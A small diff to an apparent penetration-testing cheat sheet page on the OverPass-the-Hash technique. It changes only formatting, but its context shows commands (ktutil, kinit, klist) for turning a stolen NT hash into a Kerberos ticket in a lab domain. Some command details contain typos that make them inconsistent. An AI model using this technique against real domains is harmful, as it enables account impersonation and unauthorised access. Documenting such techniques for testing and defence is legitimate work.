@@ -1,6 +1,7 @@
-## Hash - OverPass-the-Hash
+# Hash - OverPass-the-Hash
 
 In this technique, instead of passing the hash directly, we use the NT hash of an account to request a valid Kerberost ticket (TGT).
+
 
 ### Using impacket
 
@@ -16,6 +17,7 @@ root@kali:~$ ktutil -k ~/mykeys add -p tgwynn@LAB.ROPNOP.COM -e arcfour-hma-md5 
 root@kali:~$ kinit -t ~/mykers tgwynn@LAB.ROPNOP.COM
 root@kali:~$ klist
 ```
+
 
 ### Using Rubeus
 
